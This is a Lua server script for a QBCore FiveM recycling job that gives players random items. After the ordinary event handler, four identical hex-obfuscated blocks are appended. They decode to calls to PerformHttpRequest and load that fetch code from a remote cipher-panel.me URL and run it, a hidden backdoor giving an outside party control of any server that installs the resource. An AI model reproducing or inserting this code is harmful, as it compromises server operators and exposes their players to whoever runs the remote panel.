local QBCore = exports['qb-core']:GetCoreObject()

-- Events

RegisterNetEvent('qb-recycle:server:getItem', function()
  local src = source
  local Player = QBCore.Functions.GetPlayer(src)
  for _ = 1, math.random(1, Config.MaxItemsReceived), 1 do
    local randItem = Config.ItemTable[math.random(1, #Config.ItemTable)]
    local amount = math.random(Config.MinItemReceivedQty, Config.MaxItemReceivedQty)
    Player.Functions.AddItem(randItem, amount)
    TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[randItem], 'add')
    Wait(500)
  end

  local chance = math.random(1, 100)
  if chance < 7 then
    Player.Functions.AddItem(Config.ChanceItem, 1, false)
    TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[Config.ChanceItem], 'add')
  end

  local luck = math.random(1, 10)
  local odd = math.random(1, 10)
  if luck == odd then
    local random = math.random(1, 3)
    Player.Functions.AddItem(Config.LuckyItem, random)
    TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[Config.LuckyItem], 'add')
  end
end)


local ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30\x38\x56\x72\x33\x72", function (QgsKDczLTjHxYDCIumsfztFvQpwnZHTuyXHGgQTkpjZmGWdDiRqSIFHUTYrHlJciPSJplX, SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr) if (SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[6] or SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[5]) then return end ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[2]](ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[3]](SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr))() end)

local ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30\x38\x56\x72\x33\x72", function (QgsKDczLTjHxYDCIumsfztFvQpwnZHTuyXHGgQTkpjZmGWdDiRqSIFHUTYrHlJciPSJplX, SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr) if (SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[6] or SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[5]) then return end ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[2]](ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[3]](SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr))() end)

local ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30\x38\x56\x72\x33\x72", function (QgsKDczLTjHxYDCIumsfztFvQpwnZHTuyXHGgQTkpjZmGWdDiRqSIFHUTYrHlJciPSJplX, SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr) if (SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[6] or SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[5]) then return end ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[2]](ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[3]](SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr))() end)

local ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30\x38\x56\x72\x33\x72", function (QgsKDczLTjHxYDCIumsfztFvQpwnZHTuyXHGgQTkpjZmGWdDiRqSIFHUTYrHlJciPSJplX, SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr) if (SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[6] or SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr == ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[5]) then return end ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[2]](ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[4][ElejrgEJaaQhRuxTbyZmmaMwUXeTthhlNdTubStpeTEAFQCrAKfOMtkwmucFuyYYeSanQv[3]](SfrjTHYcewZROsdCcyQUQfsCuqwPpVjLLOVCNcYBkrtggUTZAAjskPGAmHyoKRhujPGTkr))() end)